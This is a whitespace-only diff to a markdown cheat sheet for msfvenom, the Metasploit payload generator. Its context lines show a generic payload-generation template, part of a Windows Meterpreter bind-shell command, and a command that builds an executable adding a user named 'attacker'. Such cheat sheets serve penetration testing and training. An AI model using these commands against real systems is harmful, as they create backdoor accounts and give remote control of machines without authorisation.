@@ -1,7 +1,6 @@
 # MSFVenom - CheatSheet
 
-`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`  
-
+`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
 One can also use the `-a` to specify the architecture or the `--platform`
 
@@ -39,8 +38,6 @@ msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f
 ### Create User
 
 ```bash
-
-
 -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
 
